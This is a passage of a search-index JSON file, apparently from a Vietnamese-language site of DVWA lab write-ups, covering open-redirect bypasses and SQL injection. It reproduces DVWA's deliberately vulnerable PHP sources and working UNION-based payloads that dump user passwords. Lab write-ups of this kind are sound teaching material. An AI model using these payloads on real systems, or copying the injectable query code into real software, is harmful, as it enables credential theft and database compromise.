Level"},{"location":"dvwa/open-http-redirect/#medium-level","text":"The code prevents you from using absolute URLs to take the user off the site, so you can either use relative URLs to take them to other pages on the same site or a Protocol-relative URL. Spoiler: Try browsing to /vulnerabilities/open_redirect/source/low.php?redirect=//digi.ninja","title":"Medium Level"},{"location":"dvwa/open-http-redirect/#high-level","text":"The redirect page tries to lock you to only redirect to the info.php page, but does this by checking that the URL contains \"info.php\". Spoiler: Try browsing to /vulnerabilities/open_redirect/source/low.php?redirect= https://digi.ninja/?a=info.php","title":"High Level"},{"location":"dvwa/open-http-redirect/#impossible-level","text":"Rather than accepting a page or URL as the redirect target, the system uses ID values to tell the redirect page where to redirect to. This ties the system down to only redirect to pages it knows about and so there is no way for an attacker to modify things to go to a page of their choosing.","title":"Impossible Level"},{"location":"dvwa/open-http-redirect/#more-information","text":"OWASP Unvalidated Redirects and Forwards Cheat Sheet WSTG - Testing for Client-side URL Redirect Mitre - CWE-601: URL Redirection to Untrusted Site ('Open Redirect') https://en.wikipedia.org/wiki/Password_cracking","title":"More Information"},{"location":"dvwa/sql-injection/","tags":["DVWA"],"text":"SQL Injection \u00b6 Notes: M\u1ee5c ti\u00eau c\u1ee7a challenge n\u00e0y l\u00e0 t\u00ecm \u0111\u01b0\u1ee3c password c\u1ee7a c\u00e1c user. Security Level: Low \u00b6 Source code vulnerabilities/sqli/source/low.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 <?php if ( isset ( $_REQUEST [ 'Submit' ] ) ) { // Get input $id = $_REQUEST [ 'id' ]; switch ( $_DVWA [ 'SQLI_DB' ]) { case MYSQL : // Check database $query = \"SELECT first_name, last_name FROM users WHERE user_id = ' $id ';\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $query ) or die ( '<pre>' . (( is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_error ( $GLOBALS [ \"___mysqli_ston\" ]) : (( $___mysqli_res = mysqli_connect_error ()) ? $___mysqli_res : false )) . '</pre>' ); // Get results while ( $row = mysqli_fetch_assoc ( $result ) ) { // Get values $first = $row [ \"first_name\" ]; $last = $row [ \"last_name\" ]; // Feedback for end user echo \"<pre>ID: { $id } <br />First name: { $first } <br />Surname: { $last } </pre>\" ; } mysqli_close ( $GLOBALS [ \"___mysqli_ston\" ]); break ; case SQLITE : global $sqlite_db_connection ; #$sqlite_db_connection = new SQLite3($_DVWA['SQLITE_DB']); #$sqlite_db_connection->enableExceptions(true); $query = \"SELECT first_name, last_name FROM users WHERE user_id = ' $id ';\" ; #print $query; try { $results = $sqlite_db_connection -> query ( $query ); } catch ( Exception $e ) { echo 'Caught exception: ' . $e -> getMessage (); exit (); } if ( $results ) { while ( $row = $results -> fetchArray ()) { // Get values $first = $row [ \"first_name\" ]; $last = $row [ \"last_name\" ]; // Feedback for end user echo \"<pre>ID: { $id } <br />First name: { $first } <br />Surname: { $last } </pre>\" ; } } else { echo \"Error in fetch \" . $sqlite_db -> lastErrorMsg (); } break ; } } ?> Analysis \u00b6 Ta s\u1ebd th\u0103m d\u00f2 m\u1ed9t v\u00e0i th\u1ee9 t\u1eeb c\u01a1 s\u1edf d\u1eef li\u1ec7u. \u0110\u1ea7u ti\u00ean, ta nh\u1eadn th\u1ea5y trong database ch\u1ec9 c\u00f3 5 user (th\u00f4ng qua vi\u1ec7c check user ID) \u0110\u1ec3 \u00fd source code tr\u00ean \u1edf d\u00f2ng 10 SELECT first_name , last_name FROM users WHERE user_id = '$id' ; Ta th\u1ea5y c\u00e2u l\u1ec7nh truy v\u1ea5n c\u01a1 s\u1edf d\u1eef li\u1ec7u kh\u00e1 \u0111\u01a1n gi\u1ea3n, l\u1ea5y th\u00f4ng tin c\u1ee7a bi\u1ebfn $id \u0111\u1ec3 check gi\u00e1 tr\u1ecb c\u1ee7a user_id . Chuy\u1ec7n g\u00ec x\u1ea3y ra n\u1ebfu gi\u00e1 tr\u1ecb c\u1ee7a bi\u1ebfn $id l\u00e0 1'or '1'='1 . Ngay l\u1eadp t\u1ee9c n\u00f3 \u0111em gi\u00e1 tr\u1ecb n\u00e0y v\u00e0o user_id v\u00e0 k\u1ebft h\u1ee3p v\u1edbi d\u1ea5u ' trong code, ta \u0111\u01b0\u1ee3c c\u00e2u l\u1ec7nh full nh\u01b0 sau SELECT first_name , last_name FROM users WHERE user_id = '1' or '1' = '1' ; L\u00fac n\u00e0y, ngay l\u1eadp t\u1ee9c c\u00e2u l\u1ec7nh select c\u1ee7a ta s\u1ebd t\u1ed3n t\u1ea1i logic or '1'='1' th\u1ec3 hi\u1ec7n vi\u1ec7c \u0111i\u1ec1u ki\u1ec7n where lu\u00f4n \u0111\u00fang. \u0110i\u1ec1u n\u00e0y v\u1ec1 c\u01a1 b\u1ea3n s\u1ebd \u0111\u1ed3ng ngh\u0129a v\u1edbi c\u00e2u l\u1ec7nh sau SELECT first_name , last_name FROM users \u0110\u00e3 c\u00f3 c\u00e1i nh\u00ecn \u0111\u1ea7u ti\u00ean cho challenge, ta s\u1ebd ti\u1ebfn h\u00e0nh khai th\u00e1c n\u00f3 th\u00f4i Exploition \u00b6 B\u1eb1ng vi\u1ec7c th\u00eam logic c\u01a1 b\u1ea3n (or'1'='1) ta d\u1ec5 d\u00e0ng l\u1ea5y \u0111\u01b0\u1ee3c th\u00f4ng tin to\u00e0n b\u1ed9 user trong table users Oke, \u0111\u00e3 th\u00e0nh c\u00f4ng ti\u00eam payload, gi\u1edd l\u00e0 b\u01b0\u1edbc k\u1ebft h\u1ee3p c\u00e1c lo\u1ea1i select \u0111\u1ec3 t\u00ecm ra \u0111\u01b0\u1ee3c c\u00e1c c\u1ed9t c\u00f3 th\u1ec3 khai th\u00e1c trong tables user \u0110\u1ea7u ti\u00ean ta ph\u1ea3i x\u00e1c \u0111\u1ecbnh h\u1ec7 qu\u1ea3n tr\u1ecb c\u01a1 s\u1edf d\u1eef li\u1ec7u c\u1ee7a challenge n\u00e0y l\u00e0 lo\u1ea1i g\u00ec b\u1eb1ng c\u00e1ch ti\u00eam payload l\u1ed7i \u0111\u1ec3 nh\u1eadn th\u00f4ng b\u00e1o l\u1ed7i Th\u1ea5y r\u1eb1ng, h\u1ecd d\u00f9ng mysql. Trong mysql ta s\u1ebd c\u00f3 table information_schema.tables l\u00e0 b\u1ea3ng ch\u1ee9a t\u1ea5t c\u1ea3 c\u00e1c b\u1ea3ng d\u1eef li\u1ec7u trong c\u01a1 s\u1edf d\u1eef li\u1ec7u. Ta s\u1ebd l\u1ea7n l\u01b0\u1ee3t t\u00ecm ki\u1ebfm th\u00f4ng tin c\u1ee7a b\u1ea3ng d\u1eef li\u1ec7u ch\u1ee9a password Tr\u01b0\u1eddng h\u1ee3p b\u1ea3ng users ch\u1ec9 l\u01b0u th\u00f4ng tin c\u01a1 b\u1ea3n c\u1ee7a user nh\u01b0 username, first_name, last_name,... v\u00e0 t\u1ed3n t\u1ea1i 1 table kh\u00e1c l\u01b0u th\u00f4ng tin password c\u1ee7a user. Hai b\u1ea3ng n\u00e0y k\u1ebft n\u1ed1i v\u1edbi nhau th\u00f4ng qua username ch\u1eb3ng h\u1ea1n. \u0110\u1eebng xem 'union select 1,table_name from information_schema.tables# Ta nh\u1eadn \u0111\u01b0\u1ee3c b\u1ea3ng users v\u00e0 guestbook. Th\u00ec ta c\u00f3 th\u1ec3 k\u1ebft lu\u1eadn password c\u00f3 th\u1ec3 l\u01b0u v\u00e0o b\u1ea3ng users. Ro\u00e0i ta s\u1ebd ti\u1ebfp t\u1ee5c xem table users c\u00f3 t\u1ed5ng c\u1ed9ng bao nhi\u00eau c\u1ed9t \u0110\u1eebng xem 'union select 1,column_name from information_schema.columns where table_name=\"users\" # Sau khi c\u00f3 th\u00f4ng tin c\u00e1c c\u1ed9t trong b\u1ea3ng th\u00ec d\u1ec5 r\u1ed3i, ta s\u1ebd l\u1ea5y ra password c\u1ee7a c\u00e1c user b\u1eb1ng vi\u1ec7c l\u1ea5y ra c\u1ed9t password v\u00e0 c\u1ed9t user_id \u0110\u1eebng xem 'union select 1,concat(user_id,\" \",password) from users # M\u1ee5c ti\u00eau ho\u00e0n th\u00e0nh. Security Level: Medium \u00b6 Source code vulnerabilities/sqli/source/medium.php <?php if ( isset ( $_POST [ 'Submit' ] ) ) { // Get input $id = $_POST [ 'id' ]; $id = mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $id ); switch ( $_DVWA [ 'SQLI_DB' ]) { case MYSQL : $query = \"SELECT first_name, last_name FROM users WHERE user_id = $id ;\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $query ) or die ( '<pre>' . mysqli_error ( $GLOBALS [ \"___mysqli_ston\" ]) . '</pre>' ); // Get results while ( $row = mysqli_fetch_assoc ( $result ) ) { // Display values $first = $row [ \"first_name\" ]; $last = $row [ \"last_name\" ]; // Feedback for end user echo \"<pre>ID: { $id } <br />First name: { $first } <br />Surname: { $last } </pre>\" ; } break ; case SQLITE : global $sqlite_db_connection ; $query = \"SELECT first_name, last_name FROM users WHERE user_id = $id ;\" ; #print $query; try { $results = $sqlite_db_connection -> query ( $query ); } catch ( Exception $e ) { echo 'Caught exception: ' . $e -> getMessage (); exit (); } if ( $results ) { while ( $row = $results -> fetchArray ()) { // Get values $first = $row [ \"first_name\" ]; $last = $row [ \"last_name\" ]; // Feedback for end user echo \"<pre>ID: { $id } <br />First name: { $first } <br />Surname: { $last } </pre>\" ; } } else { echo \"Error in fetch \" . $sqlite_db -> lastErrorMsg (); } break ; } } // This is used later on in the index.php page // Setting it here so we can close the database connection in here like in the rest of the source scripts $query = \"SELECT COUNT(*) FROM users;\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $query ) or die ( '<pre>' . (( is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_error ( $GLOBALS [ \"___mysqli_ston\" ]) : (( $___mysqli_res = mysqli_connect_error ()) ? $___mysqli_res : false )) . '</pre>' ); $number_of_rows = mysqli_fetch_row ( $result )[ 0 ]; mysqli_close ( $GLOBALS [ \"___mysqli_ston\" ]); ?> Analysis \u00b6 Th\u1eed th\u00e1ch n\u00e0y h\u1ecd chuy\u1ec3n t\u1eeb GET HTTP Request th\u00e0nh POST HTTP Request. Ta s\u1ebd d\u00f9ng Burpsuite \u0111\u1ec3 xem tr\u1ea1ng th\u00e1i g\u00f3i tin Challenge ban n\u00e3y ta c\u00f3 th\u1ec3 ti\u00eam th\u1eb3ng tr\u00ean URL. B\u00ean c\u1ea1nh \u0111\u00f3, h\u1ecd c\u00f2n filter c\u00e1c k\u00ed t\u1ef1 \u0111\u1eb7t bi\u1ec7t b\u1eb1ng vi\u1ec7c d\u00f9ng h\u00e0m mysqli_real_escape_string[^1] th\u00f4ng qua c\u00e2u l\u1ec7nh b\u00ean d\u01b0\u1edbi $id = mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $id); V\u00e0 b\u1ed9 k\u00ed t\u1ef1 \u0111\u01b0\u1ee3c filter l\u00e0 Nh\u01b0ng \u0111\u00e1ng ti\u1ebfc thay, trong truy v\u1ea5n l\u1ea1i kh\u00f4ng c\u00f3 d\u1ea5u ngo\u1eb7c k\u00e9p xung quanh d\u1eabn \u0111\u1ebfn vi\u1ec7c ta kh\u00f4ng c\u1ea7n m\u00e3 h\u00f3a d\u1ea5u ngo\u1eb7c (gbk,...) m\u00e0 v\u1eabn c\u00f3 th\u1ec3 bypass \u0111\u01b0\u1ee3c $query = \"SELECT first_name, last_name FROM users WHERE user_id = $id;\"; Exploition \u00b6 D\u00f9ng nh\u1eefng payload \u1edf m\u1ee9c \u0111\u1ed9 Low \u0111\u1ec3 bypass challenge n\u00e0y. Security Level: High \u00b6 Source code vulnerabilities/sqli/source/high.php <?php if ( isset ( $_SESSION [ 'id' ] ) ) { // Get input $id = $_SESSION [ 'id' ]; switch ( $_DVWA [ 'SQLI_DB' ]) { case MYSQL : // Check database $query = \"SELECT first_name, last_name FROM users WHERE user_id = ' $id ' LIMIT 1;\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $query ) or die ( '<pre>Something went wrong.</pre>' ); // Get results while ( $row = mysqli_fetch_assoc ( $result ) ) { // Get values $first = $row [ \"first_name\" ]; $last = $row [ \"last_name\" ]; // Feedback for end user echo \"<pre>ID: { $id } <br />First name: { $first } <br />Surname: { $last } </pre>\" ; } (( is_null ( $___mysqli_res = mysqli_close ( $GLOBALS [ \"___mysqli_ston\" ]))) ? false : $___mysqli_res ); break ; case SQLITE : global $sqlite_db_connection ; $query = \"SELECT first_name, last_name FROM users WHERE user_id = ' $id ' LIMIT 1;\" ; #print $query; try { $results = $sqlite_db_connection -> query ( $query ); } catch ( Exception $e ) { echo 'Caught exception: ' . $e -> getMessage (); exit (); } if ( $results ) { while ( $row = $results -> fetchArray ()) { // Get values $first = $row [ \"first_name\" ]; $last = $row [ \"last_name\" ]; // Feedback for end user echo \"<pre>ID: { $id } <br />First name: { $first } <br />Surname: { $last } </pre>\" ; } } else { echo \"Error in fetch \" . $sqlite_db -> lastErrorMsg (); } break ; } } ?> Analysis \u00b6 B\u00e0i n\u00e0y ch\u1eafc \u1edf m\u1ee9c Low th\u00f4i, thay v\u00ec t\u00e1c \u0111\u1ed9ng tr\u00ean URL th\u00ec b\u00e0i n\u00e0y s\u1ebd m\u1edf 1 phi\u00ean kh\u00e1c \u0111\u1ec3 nh\u1eadp payload v\u00e0o, nh\u01b0ng l\u1ea1i kh\u00f4ng c\u00f3 filter g\u00ec c\u1ea3. N\u00ean ta d\u1ec5 d\u00e0ng bypass. Exploition \u00b6 Exploit nh\u01b0 challenge Low Security Level: Impossible \u00b6 Source code vulnerabilities/sqli/source/impossible.php <?php if ( isset ( $_GET [ 'Submit' ] ) ) { // Check Anti-CSRF token checkToken ( $_REQUEST [ 'user_token' ], $_SESSION [ 'session_token' ], 'index.php' ); // Get input $id = $_GET [ 'id' ]; // Was a number entered? if ( is_numeric ( $id )) { $id = intval ( $id ); switch ( $_DVWA [ 'SQLI_DB' ]) { case MYSQL : // Check the database $data = $db -> prepare ( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' ); $data -> bindParam ( ':id' , $id , PDO :: PARAM_INT ); $data -> execute (); $row = $data -> fetch (); // Make sure only 1 result is returned if ( $data -> rowCount () == 1 ) { // Get values $first = $row [ 'first_name' ]; $last = $row [ 'last_name' ]; // Feedback for end user echo \"<pre>ID: { $id } <br />First name: { $first } <br />Surname: { $last } </pre>\" ; } break ; case SQLITE : global $sqlite_db_connection ; $stmt = $sqlite_db_connection -> prepare ( 'SELECT first_name, last_name FROM users WHERE user_id = :id LIMIT 1;' ); $stmt -> bindValue ( ':id' , $id , SQLITE3_INTEGER ); $result = $stmt -> execute (); $result -> finalize (); if ( $result !== false ) { // There is no way to get the number of rows returned // This checks the number of columns (not rows) just // as a precaution, but it won't stop someone dumping // multiple rows and viewing them one at a time. $num_columns = $result -> numColumns (); if ( $num_columns == 2 ) { $row = $result -> fetchArray (); // Get values $first = $row [ 'first_name' ]; $last = $row [ 'last_name' ]; // Feedback for end user echo \"<pre>ID: { $id } <br />First name: { $first } <br />Surname: { $last } </pre>\" ; } } break ; } } } // Generate Anti-CSRF token generateSessionToken (); ?> Analysis \u00b6 What we learned \u00b6 More Information \u00b6 https://en.wikipedia.org/wiki/SQL_injection https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/ https://owasp.org/www-community/attacks/SQL_Injection https://bobby-tables.com/ See more \u00b6 https://www.mssqltips.com/sqlservertutorial/196/information-schema-tables/ https://www.mssqltips.com/sqlservertutorial/183/information-schema-columns/ https://linuxhint.com/get-table-names-using-select-statement-in-mysql/ Xem t\u1ea1i https://www.php.net/manual/en/mysqli.real-escape-string.php \u21a9","title":"SQL Injection"},{"location":"dvwa/sql-injection/#sql-injection","text":"Notes: M\u1ee5c ti\u00eau c\u1ee7a challenge n\u00e0y l\u00e0 t\u00ecm \u0111\u01b0\u1ee3c password c\u1ee7a c\u00e1c user.","title":"SQL Injection"},{"location":"dvwa/sql-injection/#security-level-low","text":"Source code vulnerabilities/sqli/source/low.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 <?php if ( isset ( $_REQUEST [ 'Submit' ] ) ) { // Get input $id = $_REQUEST [ 'id' ]; switch ( $_DVWA [ 'SQLI_DB' ]) { case MYSQL : // Check database $query = \"SELECT first_name, last_name FROM users WHERE user_id = ' $id ';\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $query ) or die ( '<pre>' . (( is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_error ( $GLOBALS [ \"___mysqli_ston\" ]) : (( $___mysqli_res = mysqli_connect_error ()) ? $___mysqli_res : false )) . '</pre>' ); // Get results while ( $row = mysqli_fetch_assoc ( $result ) ) { // Get values $first = $row [ \"first_name\" ]; $last = $row [ \"last_name\" ]; // Feedback for end user echo \"<pre>ID: { $id } <br />First name: { $first } <br />Surname: { $last } </pre>\" ; } mysqli_close ( $GLOBALS [ \"___mysqli_ston\" ]); break ; case SQLITE : global $sqlite_db_connection ; #$sqlite_db_connection = new SQLite3($_DVWA['SQLITE_DB']); #$sqlite_db_connection->enableExceptions(true); $query = \"SELECT first_name, last_name FROM users WHERE user_id = ' $id ';\" ; #print $query; try { $results = $sqlite_db_connection -> query ( $query ); } catch ( Exception $e ) { echo 'Caught exception: ' . $e -> getMessage (); exit (); } if ( $results ) { while ( $row = $results -> fetchArray ()) { // Get values $first = $row [ \"first_name\" ]; $last = $row [ \"last_name\" ]; // Feedback for end user echo \"<pre>ID: { $id } <br />First name: { $first } <br />Surname: { $last } </pre>\" ; } } else { echo \"Error in fetch \" . $sqlite_db -> lastErrorMsg (); } break ; } } ?>","title":"Security Level: Low"},{"location":"dvwa/sql-injection/#analysis","text":"Ta s\u1ebd th\u0103m d\u00f2 m\u1ed9t v\u00e0i th\u1ee9 t\u1eeb c\u01a1 s\u1edf d\u1eef li\u1ec7u. \u0110\u1ea7u ti\u00ean, ta nh\u1eadn th\u1ea5y trong database ch\u1ec9 c\u00f3 5 user (th\u00f4ng qua vi\u1ec7c check user ID) \u0110\u1ec3 \u00fd source code tr\u00ean \u1edf d\u00f2ng 10 SELECT first_name , last_name FROM users WHERE user_id = '$id' ; Ta th\u1ea5y c\u00e2u l\u1ec7nh truy v\u1ea5n c\u01a1 s\u1edf d\u1eef li\u1ec7u kh\u00e1 \u0111\u01a1n gi\u1ea3n, l\u1ea5y th\u00f4ng tin c\u1ee7a bi\u1ebfn $id \u0111\u1ec3 check gi\u00e1 tr\u1ecb c\u1ee7a user_id . Chuy\u1ec7n g\u00ec x\u1ea3y ra n\u1ebfu gi\u00e1 tr\u1ecb c\u1ee7a bi\u1ebfn $id l\u00e0 1'or '1'='1 . Ngay l\u1eadp t\u1ee9c n\u00f3 \u0111em gi\u00e1 tr\u1ecb n\u00e0y v\u00e0o user_id v\u00e0 k\u1ebft h\u1ee3p v\u1edbi d\u1ea5u ' trong code, ta \u0111\u01b0\u1ee3c c\u00e2u l\u1ec7nh full nh\u01b0 sau SELECT first_name , last_name FROM users WHERE user_id = '1' or '1' = '1' ; L\u00fac n\u00e0y, ngay l\u1eadp t\u1ee9c c\u00e2u l\u1ec7nh select c\u1ee7a ta s\u1ebd t\u1ed3n t\u1ea1i logic or '1'='1' th\u1ec3 hi\u1ec7n vi\u1ec7c \u0111i\u1ec1u ki\u1ec7n where lu\u00f4n \u0111\u00fang. \u0110i\u1ec1u n\u00e0y v\u1ec1 c\u01a1 b\u1ea3n s\u1ebd \u0111\u1ed3ng ngh\u0129a v\u1edbi c\u00e2u l\u1ec7nh sau SELECT first_name , last_name FROM users \u0110\u00e3 c\u00f3 c\u00e1i nh\u00ecn \u0111\u1ea7u ti\u00ean cho challenge, ta s\u1ebd ti\u1ebfn h\u00e0nh khai th\u00e1c n\u00f3 th\u00f4i","title":"Analysis"},{"location":"dvwa/sql-injection/#exploition","text":"B\u1eb1ng vi\u1ec7c th\u00eam logic c\u01a1 b\u1ea3n (or'1'='1) ta d\u1ec5 d\u00e0ng l\u1ea5y \u0111\u01b0\u1ee3c th\u00f4ng tin to\u00e0n b\u1ed9 user trong table users Oke, \u0111\u00e3 th\u00e0nh c\u00f4ng ti\u00eam payload, gi\u1edd l\u00e0 b\u01b0\u1edbc k\u1ebft h\u1ee3p c\u00e1c lo\u1ea1i select \u0111\u1ec3 t\u00ecm ra \u0111\u01b0\u1ee3c c\u00e1c c\u1ed9t c\u00f3 th\u1ec3 khai th\u00e1c trong tables user \u0110\u1ea7u ti\u00ean ta ph\u1ea3i x\u00e1c \u0111\u1ecbnh h\u1ec7 qu\u1ea3n tr\u1ecb c\u01a1 s\u1edf d\u1eef li\u1ec7u c\u1ee7a challenge n\u00e0y l\u00e0 lo\u1ea1i g\u00ec b\u1eb1ng c\u00e1ch ti\u00eam payload l\u1ed7i \u0111\u1ec3 nh\u1eadn th\u00f4ng b\u00e1o l\u1ed7i Th\u1ea5y r\u1eb1ng, h\u1ecd d\u00f9ng mysql. Trong mysql ta s\u1ebd c\u00f3 table information_schema.tables l\u00e0 b\u1ea3ng ch\u1ee9a t\u1ea5t c\u1ea3 c\u00e1c b\u1ea3ng d\u1eef li\u1ec7u trong c\u01a1 s\u1edf d\u1eef li\u1ec7u. Ta s\u1ebd l\u1ea7n l\u01b0\u1ee3t t\u00ecm ki\u1ebfm th\u00f4ng tin c\u1ee7a b\u1ea3ng d\u1eef li\u1ec7u ch\u1ee9a password Tr\u01b0\u1eddng h\u1ee3p b\u1ea3ng users ch\u1ec9 l\u01b0u th\u00f4ng tin c\u01a1 b\u1ea3n c\u1ee7a user nh\u01b0 username, first_name, last_name,... v\u00e0 t\u1ed3n t\u1ea1i 1 table kh\u00e1c l\u01b0u th\u00f4ng tin password c\u1ee7a user. Hai b\u1ea3ng n\u00e0y k\u1ebft n\u1ed1i v\u1edbi nhau th\u00f4ng qua username ch\u1eb3ng h\u1ea1n. \u0110\u1eebng xem 'union select 1,table_name from information_schema.tables# Ta nh\u1eadn \u0111\u01b0\u1ee3c b\u1ea3ng users v\u00e0 guestbook. Th\u00ec ta c\u00f3 th\u1ec3 k\u1ebft lu\u1eadn password c\u00f3 th\u1ec3 l\u01b0u v\u00e0o b\u1ea3ng users. Ro\u00e0i ta s\u1ebd ti\u1ebfp t\u1ee5c xem table users c\u00f3 t\u1ed5ng c\u1ed9ng bao nhi\u00eau c\u1ed9t \u0110\u1eebng xem 'union select 1,column_name from information_schema.columns where table_name=\"users\" # Sau khi c\u00f3 th\u00f4ng tin c\u00e1c c\u1ed9t trong b\u1ea3ng th\u00ec d\u1ec5 r\u1ed3i, ta s\u1ebd l\u1ea5y ra password c\u1ee7a c\u00e1c user b\u1eb1ng vi\u1ec7c l\u1ea5y ra c\u1ed9t password v\u00e0 c\u1ed9t user_id \u0110\u1eebng xem 'union select 1,concat(user_id,\" \",password) from users # M\u1ee5c ti\u00eau ho\u00e0n th\u00e0nh.","title":"Exploition"},{"location":"dvwa/sql-injection/#security-level-medium","text":"Source code vulnerabilities/sqli/source/medium.php <?php if ( isset ( $_POST [ 'Submit' ] ) ) { // Get input $id = $_POST [ 'id' ]; $id = mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $id ); switch ( $_DVWA [ 'SQLI_DB' ]) { case MYSQL : $query = \"SELECT first_name, last_name FROM users WHERE user_id = $id ;\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $query ) or die ( '<pre>' . mysqli_error ( $GLOBALS [ \"___mysqli_ston\" ]) . '</pre>' ); // Get results while ( $row = mysqli_fetch_assoc ( $result ) ) { // Display values $first = $row [ \"first_name\" ]; $last = $row [ \"last_name\" ]; // Feedback for end user echo \"<pre>ID: { $id } <br />First name: { $first } <br />Surname: { $last } </pre>\" ; } break ; case SQLITE : global $sqlite_db_connection ; $query = \"SELECT first_name, last_name FROM users WHERE user_id = $id ;\" ; #print $query; try { $results = $sqlite_db_connection -> query ( $query ); } catch ( Exception $e ) { echo 'Caught exception: ' . $e -> getMessage (); exit (); } if ( $results ) { while ( $row = $results -> fetchArray ()) { // Get values $first = $row [ \"first_name\" ]; $last = $row [ \"last_name\" ]; // Feedback for end user echo \"<pre>ID: { $id } <br />First name: { $first } <br />Surname: { $last } </pre>\" ; } } else { echo \"Error in fetch \" . $sqlite_db -> lastErrorMsg (); } break ; } } // This is used later on in the index.php page // Setting it here so we can close the database connection in here like in the rest of the source scripts $query = \"SELECT COUNT(*) FROM users;\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $query ) or die ( '<pre>' . (( is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_error ( $GLOBALS [ \"___mysqli_ston\" ]) : (( $___mysqli_res = mysqli_connect_error ()) ? $___mysqli_res : false )) . '</pre>' ); $number_of_rows = mysqli_fetch_row ( $result )[ 0 ]; mysqli_close ( $GLOBALS [ \"___mysqli_ston\" ]); ?>","title":"Security Level: Medium"},{"location":"dvwa/sql-injection/#analysis_1","text":"Th\u1eed th\u00e1ch n\u00e0y h\u1ecd chuy\u1ec3n t\u1eeb GET HTTP Request th\u00e0nh POST HTTP Request. Ta s\u1ebd d\u00f9ng Burpsuite \u0111\u1ec3 xem tr\u1ea1ng th\u00e1i g\u00f3i tin Challenge ban n\u00e3y ta c\u00f3 th\u1ec3 ti\u00eam th\u1eb3ng tr\u00ean URL. B\u00ean c\u1ea1nh \u0111\u00f3, h\u1ecd c\u00f2n filter c\u00e1c k\u00ed t\u1ef1 \u0111\u1eb7t bi\u1ec7t b\u1eb1ng vi\u1ec7c d\u00f9ng h\u00e0m mysqli_real_escape_string[^1] th\u00f4ng qua c\u00e2u l\u1ec7nh b\u00ean d\u01b0\u1edbi $id = mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $id); V\u00e0 b\u1ed9 k\u00ed t\u1ef1 \u0111\u01b0\u1ee3c filter l\u00e0 Nh\u01b0ng \u0111\u00e1ng ti\u1ebfc thay, trong truy v\u1ea5n l\u1ea1i kh\u00f4ng c\u00f3 d\u1ea5u ngo\u1eb7c k\u00e9p xung quanh d\u1eabn \u0111\u1ebfn vi\u1ec7c ta kh\u00f4ng c\u1ea7n m\u00e3 h\u00f3a d\u1ea5u ngo\u1eb7c (gbk,...) m\u00e0 v\u1eabn c\u00f3 th\u1ec3 bypass \u0111\u01b0\u1ee3c $query = \"SELECT first_name, last_name FROM users WHERE user_id = $id;\";","title":"Analysis"},{"location":"dvwa/sql-injection/#exploition_1","text":"D\u00f9ng nh\u1eefng payload \u1edf m\u1ee9c \u0111\u1ed9 Low \u0111\u1ec3 bypass challenge n\u00e0y.","title":"Exploition"},{"location":"dvwa/sql-injection/#security-level-high","text":"Source code vulnerabilities/sqli/source/high.php <?php if ( isset ( $_SESSION [ 'id' ] ) ) { // Get input $id = $_SESSION [ 'id' ]; switch ( $_DVWA [ 'SQLI_DB' ]) { case MYSQL : // Check database $query = \"SELECT first_name, last_name FROM users WHERE user_id = ' $id ' LIMIT 1;\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $query ) or die ( '<pre>Something went wrong.</pre>' ); // Get results while ( $row = mysqli_fetch_assoc ( $result ) ) { // Get values $first = $row [ \"first_name\" ]; $last = $row [ \"last_name\" ]; // Feedback for end user echo \"<pre>ID: { $id } <br />First name: { $first } <br />Surname: { $last } </pre>\" ; } (( is_null ( $___mysqli_res = mysqli_close ( $GLOBALS [ \"___mysqli_ston\" ]))) ? false : $___mysqli_res ); break ; case SQLITE : global $sqlite_db_connection ; $query = \"SELECT first_name, last_name FROM users WHERE user_id = ' $id ' LIMIT 1;\" ; #print $query; try { $results = $sqlite_db_connection -> query ( $query ); } catch ( Exception $e ) { echo 'Caught exception: ' . $e -> getMessage (); exit (); } if ( $results ) { while ( $row = $results -> fetchArray ()) { // Get values $first = $row [ \"first_name\" ]; $last = $row [ \"last_name\" ]; // Feedback for end user echo \"<pre>ID: { $id } <br />First name: { $first } <br />Surname: { $last } </pre>\" ; } } else { echo \"Error in fetch \" . $sqlite_db -> lastErrorMsg (); } break ; } } ?>","title":"Security Level: High"},{"location":"dvwa/sql-injection/#analysis_2","text":"B\u00e0i n\u00e0y ch\u1eafc \u1edf m\u1ee9c Low th\u00f4i, thay v\u00ec t\u00e1c \u0111\u1ed9ng tr\u00ean URL th\u00ec b\u00e0i n\u00e0y s\u1ebd m\u1edf 1 phi\u00ean kh\u00e1c \u0111\u1ec3 nh\u1eadp payload v\u00e0o, nh\u01b0ng l\u1ea1i kh\u00f4ng c\u00f3 filter g\u00ec c\u1ea3. N\u00ean ta d\u1ec5 d\u00e0ng bypass.","title":"Analysis"},{"location":"dvwa/sql-injection/#exploition_2","text":"Exploit nh\u01b0 challenge Low","title":"Exploition"},{"location":"dvwa/sql-injection/#security-level-impossible","text":"Source code vulnerabilities/sqli/source/impossible.php <?php if ( isset ( $_GET [ 'Submit' ] ) ) { // Check Anti-CSRF token checkToken ( $_REQUEST [ 'user_token' ], $_SESSION [ 'session_token' ], 'index.php' ); // Get input $id = $_GET [ 'id' ]; // Was a number entered? if ( is_numeric ( $id )) { $id = intval ( $id ); switch ( $_DVWA [ 'SQLI_DB' ]) { case MYSQL : // Check the database $data = 